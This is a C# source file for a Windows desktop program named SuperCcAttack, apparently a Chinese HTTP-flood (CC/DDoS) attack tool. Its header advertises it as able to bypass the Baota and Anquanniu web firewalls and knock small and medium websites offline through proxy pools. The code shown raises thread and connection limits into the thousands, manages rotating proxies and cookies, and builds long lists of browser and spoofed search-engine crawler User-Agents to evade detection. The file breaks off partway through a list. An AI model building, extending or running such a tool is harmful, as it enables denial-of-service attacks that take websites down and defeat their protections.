using FluentScheduler;
using NLog;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

/*
作者:5115147@qq.com

简介:超级CC攻击器,可穿透网络防火墙,内置过宝塔防火墙及安全牛防火墙验证(无法过滑窗验证)

最强大的CC攻击器，开发及测试接近半年时间,软件多次升级,最终打造了这款神器

本软件功能强大，使用多个代理平台，可秒杀中小型网站

本软件不得用于攻击国内网站，不得用于攻击正常网站
 */

namespace SuperCcAttack
{
    public partial class MainForm : Form
    {
        public Options options = null;

        public MainForm(Options options)
        {
            this.options = options;

            InitializeComponent();
        }

        /// <summary>
        /// 代理列表
        /// </summary>
        public ConcurrentDictionary<string, DateTime> ProxyDic = new ConcurrentDictionary<string, DateTime>();

        /// <summary>
        /// 系统代理(未设置时使用)
        /// </summary>
        public string LocalProxy = "Local";

        /// <summary>
        /// 设置文件路径
        /// </summary>
        public string LogConfigFile = string.Empty;

        /// <summary>
        /// 浏览器标识文件
        /// </summary>
        public string UserAgentFile = "User-Agent.txt";

        /// <summary>
        /// 搜索引擎浏览器标识文件
        /// </summary>
        public string SpiderUserAgentFile = "Spider-User-Agent.txt";

        /// <summary>
        /// 配置文件
        /// </summary>
        public string ConfigFile = "Config.json";

        /// <summary>
        /// 流量统计文件
        /// </summary>
        public string StatisticFile = "Statistic.txt";

        /// <summary>
        /// 软件标题
        /// </summary>
        public string Title = "网络防火墙穿透CC";

        public string BtWafCaptchaDir = "BtCaptcha";

        /// <summary>
        /// 版本
        /// </summary>
        public string Ver = $"Ver:{Assembly.GetExecutingAssembly().GetName().Version.Major}.{Assembly.GetExecutingAssembly().GetName().Version.Minor}";

        public int ProxyError = 0;

        /// <summary>
        /// 日志
        /// </summary>
        public static Logger Log = null;

        /// <summary>
        /// 搜索引擎浏览器标识列表
        /// </summary>
        public List<string> SpiderUserAgentList = new List<string>();

        /// <summary>
        /// 浏览器标识列表
        /// </summary>
        public List<string> UserAgentList = new List<string>();

        /// <summary>
        /// 设置
        /// </summary>
        Config config = new Config();

        /// <summary>
        /// 统计信息
        /// </summary>
        StatisticInfo statisticInfo = new StatisticInfo();

        public Dictionary<string, StatisticInfo> ProxyStatisticInfoDic = new Dictionary<string, StatisticInfo>();

        public Dictionary<string, Queue<string>> ProxyUrlList = new Dictionary<string, Queue<string>>();

        public Dictionary<string, CookieContainer> ProxyCookieDic = new Dictionary<string, CookieContainer>();

        //并发数
        public Dictionary<string, int> ProxyConcurrence = new Dictionary<string, int>();

        /// <summary>
        /// 是否已初始化设置
        /// </summary>
        public bool Initialized = false;

        /// <summary>
        /// 锁 对象
        /// </summary>
        public static object LockObject = new object();

        /// <summary>
        /// 程序运行时间
        /// </summary>
        public DateTime RunDateTime = DateTime.Now;

        private void MainForm_Load(object sender, EventArgs e)
        {
            //日志设置
            string currentTime = RunDateTime.ToString("HH_mm_ss_ffff");

            if (null == Log)
            {
                GlobalDiagnosticsContext.Set("currentTime", currentTime);

                Log = LogManager.GetCurrentClassLogger();
            }

            LogConfigFile = $"Logs\\{RunDateTime.ToString("yyyy-MM-dd")}_{currentTime}_Config.txt";

            //Http连接设置
            ServicePointManager.DefaultConnectionLimit = 10000;

            ServicePointManager.Expect100Continue = false;

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;

            ServicePointManager.ServerCertificateValidationCallback += ((s, certificate, chain, sslPolicyErrors) =>
            {
                if (sslPolicyErrors == SslPolicyErrors.None)
                {
                    return true;
                }

                return false;
            });

            //线程池设置
            int workerThreads;

            int ioPortThreads;

            ThreadPool.GetMaxThreads(out workerThreads, out ioPortThreads);

            bool setMinThreadsResult = ThreadPool.SetMinThreads(ioPortThreads, ioPortThreads);

            if (!setMinThreadsResult)
            {
                setMinThreadsResult = ThreadPool.SetMinThreads(1000, 1000);
            }

            bool setMaxThreadsResult = ThreadPool.SetMaxThreads(10000, 10000);

            if (!setMaxThreadsResult)
            {
                ThreadPool.SetMaxThreads(5000, 5000);
            }

            //加载浏览器标识
            LoadUserAgent();

            //加载搜索引擎浏览器标识
            LoadSpiderUserAgent();

            //加载设置文件
            if (File.Exists(ConfigFile))
            {
                string configText = File.ReadAllText(ConfigFile);

                config = JsonHelper.DeSerialize<Config>(configText);
            }

            //参数设置
            if (!string.IsNullOrEmpty(options.ServerIp))
            {
                config.ServerIp = options.ServerIp;
            }

            if (!string.IsNullOrEmpty(options.Proxy))
            {
                config.ProxyServer = options.Proxy;
            }

            //设置控件
            SetControl();

            //设置版本标题
            this.Text = $"{Title} {Ver}";


            //设置程序图标
            this.Icon = Properties.Resources.firewall;

            if (!Directory.Exists(BtWafCaptchaDir))
            {
                Directory.CreateDirectory(BtWafCaptchaDir);
            }

            Log.Info("如需更多功能或软件定制及开发请联系作者QQ:5115147 或 960596621");

            //自动运行
            if (options.AutoRun)
            {
                btnStart_Click(null, null);
            }
        }

        /// <summary>
        /// 初始化Http请求列表
        /// </summary>
        public void InitUrlList(string proxy)
        {
            foreach (var item in config.HttpUrlList)
            {
                ProxyUrlList[proxy].Enqueue(item);
            }
        }

        /// <summary>
        /// 读取统计信息
        /// </summary>
        public void ReadStatisticInfo()
        {
            //读取已使用流量数据
            if (File.Exists(StatisticFile))
            {
                try
                {
                    string text = File.ReadAllText(StatisticFile);

                    statisticInfo = JsonHelper.DeSerialize<StatisticInfo>(text);
                }
                catch (Exception exception)
                {
                    Log.Info($"读取统计信息失败:{exception.Message}");
                }
            }
        }

        /// <summary>
        /// 保存统计信息
        /// </summary>
        public void SaveStatisticInfo()
        {
            if (options.AutoRun)
            {
                return;
            }

            string text = JsonHelper.Serialize<StatisticInfo>(statisticInfo);

            File.WriteAllText(StatisticFile, text);
        }

        public void ShowStatisticInfo()
        {
            Log.Info($"请求总次数:{statisticInfo.TotalRequest} 成功数:{statisticInfo.SuccessRequest} 失败数:{statisticInfo.FailRequest} 响应流量:{HumanReadableFilesize(statisticInfo.RequestBytes)} 当前请求数:{statisticInfo.CurrentRequest} 代理池数:{ProxyDic.Count}");
        }

        /// <summary>
        /// 将字节转换为人类方便阅读的文字
        /// </summary>
        /// <param name="size">字节值</param>
        /// <returns></returns>
        public string HumanReadableFilesize(double size)
        {
            string[] units = new string[] { "B", "KB", "MB", "GB", "TB", "PB" };

            double mod = 1024.0;

            int i = 0;

            while (size >= mod)
            {
                size /= mod;

                i++;
            }

            return Math.Round(size, 2) + units[i];
        }

        ///<summary>
        ///生成随机字符串 
        ///</summary>
        ///<param name="length">目标字符串的长度</param>
        ///<param name="useNum">是否包含数字，默认为包含</param>
        ///<param name="useLow">是否包含小写字母，默认为包含</param>
        ///<param name="useUpp">是否包含大写字母，默认为包含</param>
        ///<param name="useSpe">是否包含特殊字符，默认为不包含</param>
        ///<param name="custom">要包含的自定义字符，直接输入要包含的字符列表</param>
        ///<returns>指定长度的随机字符串</returns>
        public string GetRandomString(int length, bool useNum = true, bool useLow = true, bool useUpp = true, bool useSpe = false, string custom = null)
        {
            byte[] b = new byte[4];

            new System.Security.Cryptography.RNGCryptoServiceProvider().GetBytes(b);

            Random r = new Random(BitConverter.ToInt32(b, 0));

            StringBuilder sb = new StringBuilder(length);

            string str = custom;

            if (useNum == true) { str += "0123456789"; }

            if (useLow == true) { str += "abcdefghijklmnopqrstuvwxyz"; }

            if (useUpp == true) { str += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"; }

            if (useSpe == true) { str += "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"; }

            for (int i = 0; i < length; i++)
            {
                sb.Append(str.Substring(r.Next(0, str.Length - 1), 1));
            }

            return sb.ToString();
        }

        /// <summary>
        /// 读取浏览器标识列表
        /// </summary>
        private void LoadUserAgent()
        {
            if (File.Exists(UserAgentFile))
            {
                string[] lines = File.ReadAllLines(UserAgentFile);

                foreach (var line in lines)
                {
                    string userAgent = line.Trim();

                    if (!userAgent.StartsWith("#") && (!string.IsNullOrEmpty(userAgent)))
                    {
                        if (!UserAgentList.Contains(userAgent))
                        {
                            UserAgentList.Add(userAgent);
                        }
                    }
                }
            }

            //如果没有浏览器标识列表 设置一些默认
            if (UserAgentList.Count == 0)
            {
                //谷歌浏览器
                UserAgentList.AddRange(new string[] { 
                    //Windows
                    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",

                    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",

                    "Mozilla/5.0 (Windows NT 5.2) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",

                    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",

                    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",

                    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36",

                    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",

                    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",

                    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2",

                    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",

                    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",

                    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",

                    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",

                    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",

                    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/28.0.1469.0 Safari/537.36",

                    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",

                    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",

                    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/28.0.1469.0 Safari/537.36",

                    "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36",

                    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",

                    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36",

                    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",

                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2869.0 Safari/537.36",

                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3191.0 Safari/537.36",

                    //Mac
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.302.2 Safari/532.8",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_5) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.4 (KHTML like Gecko) Chrome/22.0.1229.79 Safari/537.4",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.31 (KHTML like Gecko) Chrome/26.0.1410.63 Safari/537.31",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2859.0 Safari/537.36",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.49 Safari/537.36",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36"
                });

                //IE浏览器
                UserAgentList.AddRange(new string[] {
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",

                    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",

                    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0)",

                    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0)",

                    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0)",

                    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",

                    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",

                    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",

                    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/5.0)",

                    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; WOW64; Trident/5.0)",

                    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",

                    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",

                    "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",

                    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko",

                    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko"
                });

                //Edge浏览器
                UserAgentList.AddRange(new string[] {
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 Edge/12.0",

                    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",

                    "Mozilla/5.0 (MSIE 9.0; Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931",

                    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
                });

                //Firefox浏览器
                UserAgentList.AddRange(new string[] { 
                    //Windows
                    "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",

                    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",

                    "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",

                    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",

                    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",

                    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",

                    "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",

                    "Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1",

                    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",

                    "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0) Gecko/16.0 Firefox/16.0",

                    "Mozilla/5.0 (Windows NT 6.2; rv:19.0) Gecko/20121129 Firefox/19.0",

                    "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0",

                    "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130401 Firefox/21.0",

                    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0",

                    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0",

                    "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",

                    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:35.0) Gecko/20100101 Firefox/35.0",

                    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",

                    "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",

                    "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",

                    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",

                    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0",

                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0",

                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",

                    //Mac
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20100101 Firefox/5.0",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:16.0) Gecko/20120813 Firefox/16.0",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:20.0) Gecko/20100101 Firefox/20.0",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:47.0) Gecko/20100101 Firefox/47.0",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:55.0) Gecko/20100101 Firefox/55.0"
                });

                //Safari浏览器
                UserAgentList.AddRange(new string[] { 
                    //Windows
                    "Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",

                    "Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",

                    "Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",

                    "Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/540.0 (KHTML like Gecko) Version/6.0 Safari/8900.00",

                    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.71 (KHTML like Gecko) WebVideo/1.0.1.10 Version/7.0 Safari/537.71",

                    //Mac
                    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X) AppleWebKit/125.2 (KHTML, like Gecko) Safari/85.8",

                    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X) AppleWebKit/125.2 (KHTML, like Gecko) Safari/125.8",

                    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X) AppleWebKit/312.5 (KHTML, like Gecko) Safari/312.3",

                    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X) AppleWebKit/418.8 (KHTML, like Gecko) Safari/419.3",

                    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",

                    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5) AppleWebKit/534.15 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",

                    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",

                    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7) AppleWebKit/534.20.8 (KHTML, like Gecko) Version/5.1 Safari/534.20.8",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/536.26.17 (KHTML like Gecko) Version/6.0.2 Safari/536.26.17",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.1 (KHTML like Gecko) Version/7.0.6 Safari/537.78.1",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/10.1 Safari/603.1.30",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50"
                });

                //Opera浏览器
                UserAgentList.AddRange(new string[] { 
                    //Windows
                    "Opera/7.50 (Windows XP; U)",

                    "Opera/7.51 (Windows NT 5.1; U)",

                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Opera 8.0",

                    "Opera/9.25 (Windows NT 6.0; U)",

                    "Opera/9.80 (Windows NT 5.2; U) Presto/2.2.15 Version/10.10",

                    "Opera/9.80 (Windows NT 5.1; U) Presto/2.8.131 Version/11.10",

                    "Opera/9.80 (Windows NT 6.1; U) Presto/2.7.62 Version/11.01",

                    "Opera/9.80 (Windows NT 6.1; U) Presto/2.9.181 Version/12.00",

                    "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",

                    "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.16",

                    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.12 Safari/537.36 OPR/14.0.1116.4",

                    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.29 Safari/537.36 OPR/15.0.1147.24",

                    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36 OPR/18.0.1284.49",

                    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36 OPR/19.0.1326.56",

                    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36 OPR/20.0.1387.91",

                    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36 OPR/28.0.1750.40",

                    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",

                    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36 OPR/36.0.2130.46",

                    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36 OPR/47.0.2631.55",

                    //Mac
                    "Opera/9.0 (Macintosh; PPC Mac OS X; U)",

                    "Opera/9.20 (Macintosh; Intel Mac OS X; U)",

                    "Opera/9.64 (Macintosh; PPC Mac OS X; U) Presto/2.1.1",

                    "Opera/9.80 (Macintosh; Intel Mac OS X; U) Presto/2.6.30 Version/10.61",

                    "Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U) Presto/2.7.62 Version/11.00",

                    "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U) Presto/2.9.168 Version/11.52",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36 OPR/28.0.1750.51",

                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.82 Safari/537.36 OPR/29.0.1795.41"
                });
            }
        }

        /// <summary>
        /// 读取浏览器标识列表
        /// </summary>
        private void LoadSpiderUserAgent()
        {
            if (File.Exists(SpiderUserAgentFile))
            {
                string[] lines = File.ReadAllLines(SpiderUserAgentFile);

                foreach (var line in lines)
                {
                    string userAgent = line.Trim();

                    if (!userAgent.StartsWith("#") && (!string.IsNullOrEmpty(userAgent)))
                    {
                        if (!SpiderUserAgentList.Contains(userAgent))
                        {
                            SpiderUserAgentList.Add(userAgent);
                        }
                    }
                }
            }

            //如果没有搜索引擎浏览器标识列表 设置一些默认
            if (SpiderUserAgentList.Count == 0)
            {
                SpiderUserAgentList.AddRange(new string[] {
                    //360
                    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0); 360Spider",
                    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider",

                    //百度
                    "Baiduspider+(+http://www.baidu.com/search/spider.htm)",
                    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search",
                    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",

                    //搜狗
                    "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm",

                    //SoSo
                    "Sosospider+(+http://help.soso.com/webspider.htm)",

                    //必应
                    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
                    "msnbot/2.0b (+http://search.msn.com/msnbot.htm)",

                    //谷歌
                    "AdsBot-Google (+http://www.google.com/adsbot.html)",
